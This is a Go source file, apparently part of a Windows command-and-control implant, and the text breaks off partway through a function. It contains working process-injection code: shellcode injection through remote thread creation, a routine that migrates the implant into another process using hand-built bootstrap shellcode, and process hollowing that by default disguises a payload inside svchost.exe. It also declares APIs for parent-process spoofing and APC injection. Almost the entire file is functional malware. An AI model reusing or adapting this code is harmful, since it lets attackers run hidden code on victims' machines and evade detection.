//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT                           = 0x1000
	MEM_RESERVE                          = 0x2000
	MEM_RELEASE                          = 0x8000
	PAGE_EXECUTE_READWRITE               = 0x40
	PAGE_EXECUTE_READ                    = 0x20
	PAGE_READWRITE                       = 0x04
	PAGE_READONLY                        = 0x02
	PROCESS_ALL_ACCESS                   = 0x1F0FFF
	CONTEXT_FULL                         = 0x10007
	IMAGE_SIZEOF_BASE_RELOCATION         = 8
	THREAD_SET_CONTEXT                   = 0x0010
	THREAD_GET_CONTEXT                   = 0x0008
	THREAD_SUSPEND_RESUME                = 0x0002
	THREAD_ALL_ACCESS                    = 0x1F03FF
	IMAGE_DIRECTORY_ENTRY_EXPORT         = 0
	IMAGE_DIRECTORY_ENTRY_IMPORT         = 1
	IMAGE_DIRECTORY_ENTRY_BASERELOC      = 5
	WAIT_TIMEOUT                         = 0x00000102
	TH32CS_SNAPTHREAD                    = 0x00000004
	MAX_MODULE_NAME32                    = 255
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
)

// Import table structures
type IMAGE_IMPORT_DESCRIPTOR struct {
	OriginalFirstThunk uint32
	TimeDateStamp      uint32
	ForwarderChain     uint32
	Name               uint32
	FirstThunk         uint32
}

type IMAGE_THUNK_DATA struct {
	AddressOfData uint64
}

type IMAGE_IMPORT_BY_NAME struct {
	Hint uint16
	Name [1]byte
}

type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// Thread enumeration structure for CreateToolhelp32Snapshot
type THREADENTRY32 struct {
	DwSize             uint32
	CntUsage           uint32
	Th32ThreadID       uint32
	Th32OwnerProcessID uint32
	TpBasePri          int32
	TpDeltaPri         int32
	DwFlags            uint32
}

// PE structures for process hollowing
type IMAGE_DOS_HEADER struct {
	Magic    uint16     // USHORT Magic number
	Cblp     uint16     // USHORT Bytes on last page of file
	Cp       uint16     // USHORT Pages in file
	Crlc     uint16     // USHORT Relocations
	Cparhdr  uint16     // USHORT Size of header in paragraphs
	MinAlloc uint16     // USHORT Minimum extra paragraphs needed
	MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
	SS       uint16     // USHORT Initial (relative) SS value
	SP       uint16     // USHORT Initial SP value
	CSum     uint16     // USHORT Checksum
	IP       uint16     // USHORT Initial IP value
	CS       uint16     // USHORT Initial (relative) CS value
	LfaRlc   uint16     // USHORT File address of relocation table
	OvNo     uint16     // USHORT Overlay number
	Res      [4]uint16  // USHORT Reserved words
	OEMId    uint16     // USHORT OEM identifier (for e_oeminfo)
	OEMInfo  uint16     // USHORT OEM information; e_oemid specific
	Res2     [10]uint16 // USHORT Reserved words
	LfaNew   int32      // LONG File address of new exe header
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_OPTIONAL_HEADER struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type IMAGE_BASE_RELOCATION struct {
	VirtualAddress uint32
	SizeOfBlock    uint32
}

type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
	// 32-bit fields (reused in union)
	Eax uint32
	Ebx uint32
	Ecx uint32
	Edx uint32
	Edi uint32
	Esi uint32
	Ebp uint32
	Esp uint32
	Eip uint32
}

// PPID spoofing structures
type PROC_THREAD_ATTRIBUTE_LIST struct {
	_dummy byte
}

type STARTUPINFOEX struct {
	StartupInfo     windows.StartupInfo
	lpAttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

// PROCESS_BASIC_INFORMATION structure
// Used to query process information including PEB address
type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessId uintptr
	Reserved3       uintptr
}

// PEB (Process Environment Block) - Merlin's structure
type PEB struct {
	InheritedAddressSpace    byte        // BYTE 0
	ReadImageFileExecOptions byte        // BYTE 1
	BeingDebugged            byte        // BYTE 2
	reserved2                [1]byte     // BYTE 3
	Mutant                   uintptr     // BYTE 4
	ImageBaseAddress         uintptr     // BYTE 8 - This is what we need!
	Ldr                      uintptr     // PPEB_LDR_DATA
	ProcessParameters        uintptr     // PRTL_USER_PROCESS_PARAMETERS
	reserved4                [3]uintptr  // PVOID
	AtlThunkSListPtr         uintptr     // PVOID
	reserved5                uintptr     // PVOID
	reserved6                uint32      // ULONG
	reserved7                uintptr     // PVOID
	reserved8                uint32      // ULONG
	AtlThunkSListPtr32       uint32      // ULONG
	reserved9                [45]uintptr // PVOID
	reserved10               [96]byte    // BYTE
	PostProcessInitRoutine   uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
	reserved11               [128]byte   // BYTE
	reserved12               [1]uintptr  // PVOID
	SessionId                uint32      // ULONG
}

var (
	kernel32                              = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                                 = windows.NewLazySystemDLL("ntdll.dll")
	procVirtualAllocEx                    = kernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx                     = kernel32.NewProc("VirtualFreeEx")
	procWriteProcessMemory                = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory                 = kernel32.NewProc("ReadProcessMemory")
	procCreateRemoteThread                = kernel32.NewProc("CreateRemoteThread")
	procWaitForSingleObject               = kernel32.NewProc("WaitForSingleObject")
	procGetExitCodeThread                 = kernel32.NewProc("GetExitCodeThread")
	procGetThreadContext                  = kernel32.NewProc("GetThreadContext")
	procSetThreadContext                  = kernel32.NewProc("SetThreadContext")
	procSuspendThread                     = kernel32.NewProc("SuspendThread")
	procResumeThread                      = kernel32.NewProc("ResumeThread")
	procNtUnmapViewOfSection              = ntdll.NewProc("NtUnmapViewOfSection")
	procQueueUserAPC                      = kernel32.NewProc("QueueUserAPC")
	procOpenThread                        = kernel32.NewProc("OpenThread")
	procVirtualProtectEx                  = kernel32.NewProc("VirtualProtectEx")
	procGlobalAddAtomA                    = kernel32.NewProc("GlobalAddAtomA")
	procGlobalGetAtomNameA                = kernel32.NewProc("GlobalGetAtomNameA")
	procGlobalDeleteAtom                  = kernel32.NewProc("GlobalDeleteAtom")
	procNtQueueApcThread                  = ntdll.NewProc("NtQueueApcThread")
	procCreateToolhelp32Snapshot          = kernel32.NewProc("CreateToolhelp32Snapshot")
	procThread32First                     = kernel32.NewProc("Thread32First")
	procThread32Next                      = kernel32.NewProc("Thread32Next")
	procCreateProcessW                    = kernel32.NewProc("CreateProcessW")
	procInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = kernel32.NewProc("DeleteProcThreadAttributeList")
	procNtQueryInformationProcess         = ntdll.NewProc("NtQueryInformationProcess")
)

// InjectShellcode injects shellcode into a target process
func (i *Implant) InjectShellcode(pid int, shellcode []byte) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Allocate memory in target process
	addr, err := virtualAllocEx(hProcess, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	// Write shellcode to allocated memory
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if ret == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// Create remote thread to execute shellcode
	var threadID uint32
	hThread, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0,
		0,
		addr,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)

	if hThread == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("CreateRemoteThread failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	result := map[string]interface{}{
		"status":        "success",
		"pid":           pid,
		"address":       fmt.Sprintf("0x%x", addr),
		"thread_id":     threadID,
		"shellcode_len": len(shellcode),
		"method":        "classic_injection",
	}

	return json.Marshal(result)
}
// MigrateProcess migrates the current implant to another process
func (i *Implant) MigrateProcess(targetPID int) ([]byte, error) {
	// Production implementation of process migration
	// Strategy: Read our own executable from disk and perform process hollowing
	// This ensures the full implant (including all capabilities) runs in the target

	originalPID := getCurrentPID()

	// Step 1: Read our own executable from disk
	exePath, err := getExecutablePath()
	if err != nil {
		return nil, fmt.Errorf("failed to get executable path: %v", err)
	}

	// Read the entire executable into memory
	implantBytes, err := os.ReadFile(exePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read implant executable: %v", err)
	}

	if len(implantBytes) < 1024 {
		return nil, fmt.Errorf("implant executable too small: %d bytes", len(implantBytes))
	}

	// Step 2: Verify it's a valid PE file
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&implantBytes[0]))
	if dosHeader.Magic != 0x5A4D {
		return nil, fmt.Errorf("invalid implant executable: missing MZ signature")
	}

	// Step 3: Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(targetPID))
	if err != nil {
		return nil, fmt.Errorf("failed to open target process %d: %v", targetPID, err)
	}
	defer windows.CloseHandle(hProcess)

	// Step 4: Parse PE headers to determine injection method
	ntHeadersOffset := uint32(dosHeader.LfaNew)
	if ntHeadersOffset > uint32(len(implantBytes)-int(unsafe.Sizeof(IMAGE_NT_HEADERS{}))) {
		return nil, fmt.Errorf("invalid PE: NT headers offset out of bounds")
	}

	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&implantBytes[ntHeadersOffset]))
	if ntHeaders.Signature != 0x4550 {
		return nil, fmt.Errorf("invalid PE: missing PE signature")
	}

	// Step 5: Check if target process is 32-bit or 64-bit
	var targetIs64Bit bool
	err = windows.IsWow64Process(hProcess, &targetIs64Bit)
	if err != nil {
		// Assume same architecture as us
		targetIs64Bit = (unsafe.Sizeof(uintptr(0)) == 8)
	}
	targetIs64Bit = !targetIs64Bit // IsWow64Process returns true if 32-bit on 64-bit Windows

	implantIs64Bit := (ntHeaders.FileHeader.Machine == 0x8664) // IMAGE_FILE_MACHINE_AMD64

	if targetIs64Bit != implantIs64Bit {
		return nil, fmt.Errorf("architecture mismatch: implant is %d-bit, target is %d-bit",
			map[bool]int{true: 64, false: 32}[implantIs64Bit],
			map[bool]int{true: 64, false: 32}[targetIs64Bit])
	}

	// Step 6: Allocate memory in target process for the entire executable
	imageSize := ntHeaders.OptionalHeader.SizeOfImage
	remoteBase, err := virtualAllocEx(hProcess, 0, int(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("failed to allocate memory in target: %v", err)
	}

	// Step 7: Write PE headers
	headersSize := ntHeaders.OptionalHeader.SizeOfHeaders
	err = writeProcessMemory(hProcess, remoteBase, unsafe.Pointer(&implantBytes[0]), uintptr(headersSize))
	if err != nil {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to write PE headers: %v", err)
	}

	// Step 8: Write all sections
	sectionHeaderOffset := ntHeadersOffset + uint32(unsafe.Sizeof(IMAGE_NT_HEADERS{}))
	numberOfSections := ntHeaders.FileHeader.NumberOfSections

	for j := uint16(0); j < numberOfSections; j++ {
		sectionOffset := sectionHeaderOffset + uint32(j)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&implantBytes[sectionOffset]))

		if section.SizeOfRawData == 0 {
			continue
		}

		sectionDest := remoteBase + uintptr(section.VirtualAddress)
		sectionSource := unsafe.Pointer(&implantBytes[section.PointerToRawData])

		err = writeProcessMemory(hProcess, sectionDest, sectionSource, uintptr(section.SizeOfRawData))
		if err != nil {
			virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
			return nil, fmt.Errorf("failed to write section %d: %v", j, err)
		}
	}

	// Step 9: Perform base relocations if needed
	preferredBase := uintptr(ntHeaders.OptionalHeader.ImageBase)
	if remoteBase != preferredBase {
		delta := int64(remoteBase) - int64(preferredBase)
		err = performMigrationRelocation(hProcess, implantBytes, ntHeaders, remoteBase, delta)
		if err != nil {
			// Non-fatal: continue anyway, some executables don't need relocation
		}
	}

	// Step 10: Resolve imports (critical for standalone execution)
	err = resolveImports(hProcess, implantBytes, ntHeaders, remoteBase)
	if err != nil {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to resolve imports: %v", err)
	}

	// Step 11: Set proper memory protections for each section
	err = setMemoryProtections(hProcess, implantBytes, ntHeaders, remoteBase)
	if err != nil {
		// Non-fatal: continue with RWX permissions
	}

	// Step 12: Calculate entry point
	entryPoint := remoteBase + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)

	// Step 13: Create shellcode to bootstrap the migrated implant
	// The shellcode will:
	// 1. Set up proper execution context
	// 2. Pass command-line arguments (server address, etc.)
	// 3. Jump to entry point
	bootstrapShellcode := generateMigrationBootstrap(entryPoint, remoteBase)

	// Step 14: Allocate memory for bootstrap shellcode
	bootstrapAddr, err := virtualAllocEx(hProcess, 0, len(bootstrapShellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to allocate bootstrap memory: %v", err)
	}

	err = writeProcessMemory(hProcess, bootstrapAddr, unsafe.Pointer(&bootstrapShellcode[0]), uintptr(len(bootstrapShellcode)))
	if err != nil {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, bootstrapAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to write bootstrap shellcode: %v", err)
	}

	// Step 15: Create remote thread to execute the migrated implant
	var threadID uint32
	hThread, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0,
		0,
		bootstrapAddr,
		remoteBase, // Pass base address as parameter
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)

	if hThread == 0 {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, bootstrapAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to create remote thread: %v", err)
	}
	windows.CloseHandle(windows.Handle(hThread))

	// Step 16: Build result before we exit
	result := map[string]interface{}{
		"status":            "success",
		"method":            "process_migration",
		"original_pid":      originalPID,
		"target_pid":        targetPID,
		"migrated_base":     fmt.Sprintf("0x%x", remoteBase),
		"entry_point":       fmt.Sprintf("0x%x", entryPoint),
		"bootstrap_address": fmt.Sprintf("0x%x", bootstrapAddr),
		"thread_id":         threadID,
		"implant_size":      len(implantBytes),
		"note":              "Implant migrated successfully. Original process will terminate.",
	}

	resultBytes, _ := json.Marshal(result)

	// Step 17: Schedule self-termination after a short delay
	// This allows the response to be sent back to the server
	go func() {
		time.Sleep(2 * time.Second)
		// Gracefully exit
		os.Exit(0)
	}()

	return resultBytes, nil
}

// performMigrationRelocation performs relocations for process migration
func performMigrationRelocation(hProcess windows.Handle, peBytes []byte, ntHeaders *IMAGE_NT_HEADERS, newBase uintptr, delta int64) error {
	relocDir := ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
	if relocDir.Size == 0 {
		return nil // No relocations needed
	}

	relocOffset := relocDir.VirtualAddress
	relocSize := relocDir.Size

	for relocSize > 0 {
		if relocOffset+IMAGE_SIZEOF_BASE_RELOCATION > uint32(len(peBytes)) {
			break
		}

		baseReloc := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(&peBytes[relocOffset]))
		if baseReloc.SizeOfBlock == 0 {
			break
		}

		entriesCount := (baseReloc.SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2
		relocEntries := (*[0xFFFF]uint16)(unsafe.Pointer(&peBytes[relocOffset+IMAGE_SIZEOF_BASE_RELOCATION]))

		for i := uint32(0); i < entriesCount; i++ {
			entry := relocEntries[i]
			relocType := entry >> 12
			offset := entry & 0xFFF

			if relocType == 0 { // IMAGE_REL_BASED_ABSOLUTE
				continue
			}

			if relocType == 10 || relocType == 3 { // IMAGE_REL_BASED_DIR64 or HIGHLOW
				patchAddress := newBase + uintptr(baseReloc.VirtualAddress) + uintptr(offset)

				if relocType == 10 { // 64-bit
					var originalValue uint64
					err := readProcessMemory(hProcess, patchAddress, unsafe.Pointer(&originalValue), 8)
					if err != nil {
						continue
					}
					newValue := uint64(int64(originalValue) + delta)
					writeProcessMemory(hProcess, patchAddress, unsafe.Pointer(&newValue), 8)
				} else { // 32-bit
					var originalValue32 uint32
					err := readProcessMemory(hProcess, patchAddress, unsafe.Pointer(&originalValue32), 4)
					if err != nil {
						continue
					}
					newValue32 := uint32(int64(originalValue32) + delta)
					writeProcessMemory(hProcess, patchAddress, unsafe.Pointer(&newValue32), 4)
				}
			}
		}

		relocSize -= baseReloc.SizeOfBlock
		relocOffset += baseReloc.SizeOfBlock
	}

	return nil
}

// setMemoryProtections sets proper memory protections for PE sections
func setMemoryProtections(hProcess windows.Handle, peBytes []byte, ntHeaders *IMAGE_NT_HEADERS, baseAddress uintptr) error {
	// sectionHeaderOffset := ntHeaders.FileHeader.SizeOfOptionalHeader + 4 + uint16(unsafe.Sizeof(IMAGE_FILE_HEADER{}))
	numberOfSections := ntHeaders.FileHeader.NumberOfSections

	for i := uint16(0); i < numberOfSections; i++ {
		sectionOffset := uint32(unsafe.Offsetof(IMAGE_NT_HEADERS{}.FileHeader)) + uint32(unsafe.Sizeof(IMAGE_FILE_HEADER{})) +
			uint32(unsafe.Sizeof(IMAGE_OPTIONAL_HEADER{})) + uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))

		if sectionOffset >= uint32(len(peBytes)) {
			break
		}

		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&peBytes[sectionOffset]))
		sectionAddr := baseAddress + uintptr(section.VirtualAddress)
		sectionSize := uintptr(section.VirtualSize)

		var protection uint32 = PAGE_READWRITE

		// Determine protection based on section characteristics
		characteristics := section.Characteristics
		if characteristics&0x20000000 != 0 { // IMAGE_SCN_MEM_EXECUTE
			if characteristics&0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
				protection = PAGE_EXECUTE_READWRITE
			} else {
				protection = PAGE_EXECUTE_READWRITE // Keep as RWX for compatibility
			}
		} else if characteristics&0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
			protection = PAGE_READWRITE
		} else {
			protection = PAGE_READWRITE // Keep as RW for compatibility
		}

		var oldProtection uint32
		procVirtualProtectEx.Call(
			uintptr(hProcess),
			sectionAddr,
			sectionSize,
			uintptr(protection),
			uintptr(unsafe.Pointer(&oldProtection)),
		)
	}

	return nil
}

// generateMigrationBootstrap generates shellcode to bootstrap the migrated implant
func generateMigrationBootstrap(entryPoint uintptr, imageBase uintptr) []byte {
	// x64 shellcode to call the entry point
	// This mimics what the Windows loader does
	shellcode := []byte{
		// Save registers
		0x50,       // push rax
		0x51,       // push rcx
		0x52,       // push rdx
		0x53,       // push rbx
		0x55,       // push rbp
		0x56,       // push rsi
		0x57,       // push rdi
		0x41, 0x50, // push r8
		0x41, 0x51, // push r9
		0x41, 0x52, // push r10
		0x41, 0x53, // push r11

		// Align stack to 16-byte boundary
		0x48, 0x83, 0xE4, 0xF0, // and rsp, 0xFFFFFFFFFFFFFFF0

		// Allocate shadow space (32 bytes for Windows x64 calling convention)
		0x48, 0x83, 0xEC, 0x20, // sub rsp, 0x20

		// Set up parameters (following Windows calling convention)
		0x48, 0xB9, // mov rcx, imageBase (hInstance)
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // imageBase (will be patched)

		0x48, 0x31, 0xD2, // xor rdx, rdx (hPrevInstance = NULL)
		0x4D, 0x31, 0xC0, // xor r8, r8 (lpCmdLine = NULL)
		0x4D, 0x31, 0xC9, // xor r9, r9 (nCmdShow = 0)

		// Call entry point
		0x48, 0xB8, // mov rax, entryPoint
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // entryPoint (will be patched)

		0xFF, 0xD0, // call rax

		// Clean up stack
		0x48, 0x83, 0xC4, 0x20, // add rsp, 0x20

		// Restore registers
		0x41, 0x5B, // pop r11
		0x41, 0x5A, // pop r10
		0x41, 0x59, // pop r9
		0x41, 0x58, // pop r8
		0x5F, // pop rdi
		0x5E, // pop rsi
		0x5D, // pop rbp
		0x5B, // pop rbx
		0x5A, // pop rdx
		0x59, // pop rcx
		0x58, // pop rax

		// Return
		0xC3, // ret
	}

	// Patch imageBase at offset 26
	*(*uint64)(unsafe.Pointer(&shellcode[26])) = uint64(imageBase)

	// Patch entryPoint at offset 40
	*(*uint64)(unsafe.Pointer(&shellcode[40])) = uint64(entryPoint)

	return shellcode
}

// ProcessHollowing performs process hollowing (RunPE technique)
func (i *Implant) ProcessHollowing(targetPath string, payloadBytes []byte) ([]byte, error) {
	if targetPath == "" {
		targetPath = "C:\\Windows\\System32\\svchost.exe" // Default target
	}

	if len(payloadBytes) < 1024 {
		return nil, fmt.Errorf("payload too small to be a valid PE file")
	}

	// Step 1: Parse payload PE headers
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&payloadBytes[0]))
	if dosHeader.Magic != 0x5A4D { // "MZ"
		return nil, fmt.Errorf("invalid PE file: missing MZ signature")
	}

	ntHeadersOffset := uint32(dosHeader.LfaNew)
	if ntHeadersOffset > uint32(len(payloadBytes)-int(unsafe.Sizeof(IMAGE_NT_HEADERS{}))) {
		return nil, fmt.Errorf("invalid PE file: NT headers offset out of bounds")
	}

	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&payloadBytes[ntHeadersOffset]))
	if ntHeaders.Signature != 0x4550 { // "PE\0\0"
		return nil, fmt.Errorf("invalid PE file: missing PE signature")
	}

	// Step 2: Create target process in suspended state
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	targetPathPtr, err := syscall.UTF16PtrFromString(targetPath)
	if err != nil {
		return nil, fmt.Errorf("failed to convert target path: %v", err)
	}

	err = windows.CreateProcess(
		nil,
		targetPathPtr,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return nil, fmt.Errorf("failed to create suspended process: %v", err)
	}

	defer func() {
		if err != nil {
			windows.TerminateProcess(pi.Process, 1)
		}
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
	}()

	// Step 3: Get target process context
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_FULL
	err = getThreadContext(pi.Thread, &ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to get thread context: %v", err)
	}

	// Step 4: Read target process PEB to get image base
	var pebAddress uintptr
	if unsafe.Sizeof(uintptr(0)) == 8 { // 64-bit
		pebAddress = uintptr(ctx.Rdx) // PEB address in RDX for 64-bit
	} else { // 32-bit
		pebAddress = uintptr(ctx.Ebx) // PEB address in EBX for 32-bit
	}

	var targetImageBase uintptr
	err = readProcessMemory(pi.Process, pebAddress+0x10, unsafe.Pointer(&targetImageBase), unsafe.Sizeof(targetImageBase))
	if err != nil {
		return nil, fmt.Errorf("failed to read image base from PEB: %v", err)
	}

	// Step 5: Unmap the original executable
	err = ntUnmapViewOfSection(pi.Process, targetImageBase)
	if err != nil {
		// Non-fatal: some targets may not allow unmapping, continue anyway
	}

	// Step 6: Allocate memory for payload at preferred base address
	payloadImageBase := uintptr(ntHeaders.OptionalHeader.ImageBase)
	imageSize := uintptr(ntHeaders.OptionalHeader.SizeOfImage)

	allocatedBase, err := virtualAllocEx(pi.Process, payloadImageBase, int(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil || allocatedBase == 0 {
		// If preferred base fails, try allocating anywhere
		allocatedBase, err = virtualAllocEx(pi.Process, 0, int(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if err != nil {
			return nil, fmt.Errorf("failed to allocate memory in target process: %v", err)
		}
	}

	// Step 7: Write PE headers
	headersSize := ntHeaders.OptionalHeader.SizeOfHeaders
	err = writeProcessMemory(pi.Process, allocatedBase, unsafe.Pointer(&payloadBytes[0]), uintptr(headersSize))
	if err != nil {
		return nil, fmt.Errorf("failed to write PE headers: %v", err)
	}

	// Step 8: Write sections
	sectionHeaderOffset := ntHeadersOffset + uint32(unsafe.Sizeof(IMAGE_NT_HEADERS{}))
	numberOfSections := ntHeaders.FileHeader.NumberOfSections

	for i := uint16(0); i < numberOfSections; i++ {
		sectionOffset := sectionHeaderOffset + uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payloadBytes[sectionOffset]))

		if section.SizeOfRawData == 0 {
			continue
		}

		sectionDestination := allocatedBase + uintptr(section.VirtualAddress)
		sectionSource := unsafe.Pointer(&payloadBytes[section.PointerToRawData])

		err = writeProcessMemory(pi.Process, sectionDestination, sectionSource, uintptr(section.SizeOfRawData))
		if err != nil {
			return nil, fmt.Errorf("failed to write section %d: %v", i, err)
		}
	}

	// Step 9: Perform base relocation if needed
	if allocatedBase != payloadImageBase {
		delta := int64(allocatedBase) - int64(payloadImageBase)
		err = performRelocation(pi.Process, payloadBytes, ntHeaders, allocatedBase, delta)
		if err != nil {
			// Non-fatal: some payloads may not need relocation
		}
	}

	// Step 10: Update entry point in thread context
	entryPoint := allocatedBase + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)

	if unsafe.Sizeof(uintptr(0)) == 8 { // 64-bit
		ctx.Rcx = uint64(entryPoint)
		ctx.Rdx = uint64(allocatedBase) // Update PEB image base
	} else { // 32-bit
		ctx.Eax = uint32(entryPoint)
	}

	// Step 11: Write new image base to PEB
	err = writeProcessMemory(pi.Process, pebAddress+0x10, unsafe.Pointer(&allocatedBase), unsafe.Sizeof(allocatedBase))
	if err != nil {
		return nil, fmt.Errorf("failed to update PEB image base: %v", err)
	}

	// Step 12: Set updated context
	err = setThreadContext(pi.Thread, &ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to set thread context: %v", err)
	}

	// Step 13: Resume the thread
